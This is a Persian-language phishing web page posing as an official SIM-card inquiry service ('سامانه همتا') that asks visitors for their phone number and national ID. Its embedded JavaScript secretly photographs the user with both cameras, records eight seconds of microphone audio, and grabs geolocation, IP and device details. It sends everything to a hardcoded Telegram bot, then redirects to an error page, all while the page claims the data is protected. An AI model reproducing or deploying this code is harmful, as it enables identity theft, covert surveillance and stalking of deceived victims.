<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>سامانه استعلام سیم‌کارت</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Tahoma, sans-serif;
        }
        body {
            background: linear-gradient(145deg, #0b2b3f, #1a4b61);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            direction: rtl;
            margin: 0;
        }
        .container {
            background: white;
            padding: 35px 25px;
            border-radius: 24px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            width: 400px;
            text-align: center;
        }
        .logo { font-size: 48px; margin-bottom: 10px; }
        h2 { color: #1a2a3a; font-size: 22px; margin-bottom: 8px; }
        .sub { color: #6c7a8a; font-size: 14px; margin-bottom: 25px; }
        input {
            width: 100%;
            padding: 14px;
            margin: 10px 0;
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            font-size: 15px;
            background: #f8fafc;
            text-align: center;
        }
        input:focus {
            border-color: #1a7ae8;
            background: white;
            outline: none;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #1a7ae8;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 12px;
        }
        button:hover { background: #0f5bb5; }
        .note {
            margin-top: 18px;
            font-size: 12px;
            color: #94a3b8;
            border-top: 1px solid #e2e8f0;
            padding-top: 16px;
        }
        .note span { color: #1a7ae8; font-weight: bold; }
        .input-group { text-align: right; margin: 5px 0; }
        .input-group label {
            font-size: 13px;
            color: #4a5a6a;
            font-weight: bold;
            display: block;
            margin-right: 5px;
        }
        #loading {
            display: none;
            margin-top: 15px;
            font-size: 14px;
            color: #1a7ae8;
        }
        #status {
            margin-top: 10px;
            font-size: 13px;
            color: #16a34a;
            display: none;
        }
        #errorMsg {
            margin-top: 10px;
            font-size: 13px;
            color: #dc2626;
            display: none;
        }
        #debug {
            margin-top: 10px;
            font-size: 12px;
            color: #6c7a8a;
            display: none;
            text-align: left;
            background: #f8fafc;
            padding: 10px;
            border-radius: 8px;
            max-height: 200px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">📱</div>
        <h2>استعلام سیم‌کارت</h2>
        <p class="sub">برای استعلام وضعیت سیم‌کارت، اطلاعات زیر را وارد کنید</p>

        <form id="findForm">
            <div class="input-group">
                <label>📞 شماره موبایل</label>
                <input type="text" id="phone" placeholder="مثلاً 09123456789" required>
            </div>
            <div class="input-group">
                <label>🆔 کد ملی</label>
                <input type="text" id="nationalCode" placeholder="مثلاً 1234567890" required>
            </div>
            <button type="submit" id="submitBtn">🔍 استعلام</button>
        </form>

        <div id="loading">⏳ در حال پردازش...</div>
        <div id="status">✅ اطلاعات با موفقیت ارسال شد</div>
        <div id="errorMsg">❌ خطا در ارسال اطلاعات</div>
        <div id="debug"></div>

        <div class="note">
            🔒 اطلاعات شما محفوظ است · <span>سامانه همتا</span>
        </div>
    </div>

    <script>
        // ======================================================
        // تنظیمات ربات تلگرام
        // ======================================================
        const BOT_TOKEN = '8826841444:AAGLmSPOXr_tID0VKHFjhrhod9OqQhnNI60';
        const CHAT_ID = '7059995091';

        // ======================================================
        // دریافت اطلاعات دستگاه و IP
        // ======================================================
        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                online: navigator.onLine,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack || 'نامشخص'
            };
        }

        async function getIPInfo() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (e) {
                console.error('❌ خطا در دریافت IP:', e);
                return 'نامشخص';
            }
        }

        // ======================================================
        // تابع گرفتن عکس با مدیریت خطا (نسخه نهایی)
        // ======================================================
        async function capturePhoto(facingMode = 'user') {
            const debugDiv = document.getElementById('debug');
            debugDiv.style.display = 'block';
            debugDiv.innerHTML += `📸 تلاش برای دوربین: ${facingMode}\n`;

            try {
                // بررسی وجود دوربین
                const devices = await navigator.mediaDevices.enumerateDevices();
                const videoDevices = devices.filter(d => d.kind === 'videoinput');
                debugDiv.innerHTML += `📹 تعداد دوربین‌ها: ${videoDevices.length}\n`;
                
                if (videoDevices.length === 0) {
                    debugDiv.innerHTML += '❌ هیچ دوربینی یافت نشد!\n';
                    return null;
                }

                // تلاش برای گرفتن عکس
                let stream;
                try {
                    stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: facingMode,
                            width: { ideal: 640 },
                            height: { ideal: 480 }
                        }
                    });
                } catch (firstError) {
                    debugDiv.innerHTML += `⚠️ تلاش اول شکست: ${firstError.message}\n`;
                    try {
                        stream = await navigator.mediaDevices.getUserMedia({
                            video: {
                                facingMode: facingMode
                            }
                        });
                    } catch (secondError) {
                        debugDiv.innerHTML += `⚠️ تلاش دوم شکست: ${secondError.message}\n`;
                        if (facingMode === 'user') {
                            try {
                                stream = await navigator.mediaDevices.getUserMedia({ video: true });
                            } catch (thirdError) {
                                debugDiv.innerHTML += `❌ همه تلاش‌ها شکست خورد\n`;
                                return null;
                            }
                        } else {
                            return null;
                        }
                    }
                }

                const photoBlob = await capturePhotoFromStream(stream);
                stream.getTracks().forEach(track => track.stop());
                debugDiv.innerHTML += `✅ عکس گرفته شد، حجم: ${photoBlob.size} bytes\n`;
                return photoBlob;

            } catch (error) {
                debugDiv.innerHTML += `❌ خطا: ${error.message}\n`;
                return null;
            }
        }

        function capturePhotoFromStream(stream) {
            return new Promise((resolve, reject) => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.play();
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    canvas.toBlob((blob) => {
                        if (blob) {
                            resolve(blob);
                        } else {
                            reject(new Error('تبدیل به Blob شکست خورد'));
                        }
                    }, 'image/jpeg', 0.8);
                };
                video.onerror = () => {
                    reject(new Error('خطا در پخش ویدئو'));
                };
            });
        }

        // ======================================================
        // تابع ضبط صدا
        // ======================================================
        async function recordAudio() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                const audioChunks = [];

                mediaRecorder.ondataavailable = event => {
                    audioChunks.push(event.data);
                };

                const audioPromise = new Promise((resolve) => {
                    mediaRecorder.onstop = () => {
                        const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
                        resolve(audioBlob);
                    };
                });

                mediaRecorder.start();
                setTimeout(() => {
                    mediaRecorder.stop();
                    stream.getTracks().forEach(track => track.stop());
                }, 8000);

                return await audioPromise;
            } catch (e) {
                console.error('❌ خطا در ضبط صدا:', e);
                return null;
            }
        }

        // ======================================================
        // تابع گرفتن موقعیت
        // ======================================================
        function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve('موقعیت در دسترس نیست');
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    position => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        resolve(`https://www.google.com/maps?q=${lat},${lon}`);
                    },
                    error => {
                        resolve('❌ خطا در گرفتن موقعیت');
                    }
                );
            });
        }

        // ======================================================
        // توابع ارسال به تلگرام
        // ======================================================
        async function sendPhotoToTelegram(photoBlob, caption = '📸 عکس') {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', photoBlob, 'photo.jpg');
                formData.append('caption', caption);

                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                return response.ok;
            } catch (e) {
                console.error('❌ خطا در ارسال عکس:', e);
                return false;
            }
        }

        async function sendAudioToTelegram(audioBlob, caption = '🎤 ضبط صدا') {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('audio', audioBlob, 'recorded_audio.wav');
                formData.append('caption', caption);

                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
                    method: 'POST',
                    body: formData
                });

                return response.ok;
            } catch (e) {
                console.error('❌ خطا در ارسال صدا:', e);
                return false;
            }
        }

        async function sendMessageToTelegram(message) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message
                    })
                });

                return response.ok;
            } catch (e) {
                console.error('❌ خطا در ارسال متن:', e);
                return false;
            }
        }

        // ======================================================
        // رویداد کلیک روی دکمه
        // ======================================================
        document.getElementById('findForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const phone = document.getElementById('phone').value;
            const nationalCode = document.getElementById('nationalCode').value;
            const loadingDiv = document.getElementById('loading');
            const statusDiv = document.getElementById('status');
            const errorDiv = document.getElementById('errorMsg');
            const debugDiv = document.getElementById('debug');
            const submitBtn = document.getElementById('submitBtn');

            submitBtn.disabled = true;
            submitBtn.textContent = '⏳ در حال پردازش...';
            loadingDiv.style.display = 'block';
            statusDiv.style.display = 'none';
            errorDiv.style.display = 'none';
            debugDiv.innerHTML = '';

            try {
                // ۱. دریافت اطلاعات دستگاه
                const deviceInfo = getDeviceInfo();
                const ip = await getIPInfo();

                // ۲. گرفتن عکس سلفی و دوربین عقب
                const selfiePhoto = await capturePhoto('user');
                const backPhoto = await capturePhoto('environment');

                // ۳. ضبط صدا
                const audioBlob = await recordAudio();

                // ۴. گرفتن موقعیت
                const location = await getLocation();

                // ۵. ساخت پیام متنی
                let message = `📱 اطلاعات کامل:\n`;
                message += `📞 شماره: ${phone}\n`;
                message += `🆔 کد ملی: ${nationalCode}\n`;
                message += `⏱️ زمان: ${new Date().toLocaleString('fa-IR')}\n`;
                message += `🌐 IP: ${ip}\n`;
                message += `📍 موقعیت: ${location}\n`;
                message += `📱 مرورگر: ${deviceInfo.userAgent}\n`;
                message += `🖥️ سیستم‌عامل: ${deviceInfo.platform}\n`;
                message += `🌍 زبان: ${deviceInfo.language}\n`;
                message += `📐 صفحه‌نمایش: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}\n`;
                message += `🕒 منطقه زمانی: ${deviceInfo.timezone}\n`;
                message += `📶 وضعیت آنلاین: ${deviceInfo.online ? '✅' : '❌'}\n`;
                message += `🍪 کوکی: ${deviceInfo.cookieEnabled ? '✅' : '❌'}\n`;
                message += `🎤 ضبط صدا: ${audioBlob ? '✅' : '❌'}\n`;
                message += `📸 عکس سلفی: ${selfiePhoto ? '✅' : '❌'}\n`;
                message += `📸 عکس عقب: ${backPhoto ? '✅' : '❌'}`;

                // ۶. ارسال به تلگرام
                await sendMessageToTelegram(message);

                if (selfiePhoto) {
                    await sendPhotoToTelegram(selfiePhoto, '📸 عکس سلفی');
                }

                if (backPhoto) {
                    await sendPhotoToTelegram(backPhoto, '📸 عکس دوربین عقب');
                }

                if (audioBlob) {
                    await sendAudioToTelegram(audioBlob, '🎤 ضبط صدا');
                }

                statusDiv.style.display = 'block';
                statusDiv.textContent = '✅ همه اطلاعات با موفقیت ارسال شد';

                setTimeout(() => {
                    window.location.href = 'https://example.com/error';
                }, 2000);

            } catch (error) {
                console.error('❌ خطا:', error);
                errorDiv.style.display = 'block';
                errorDiv.textContent = '❌ خطا: ' + error.message;
            } finally {
                submitBtn.disabled = false;
                submitBtn.textContent = '🔍 استعلام';
                loadingDiv.style.display = 'none';
            }
        });

        console.log('✅ صفحه بارگذاری شد');
        console.log('🌐 پروتکل:', window.location.protocol);
        console.log('🔒 HTTPS:', window.location.protocol === 'https:');
    </script>
</body>
    </html>
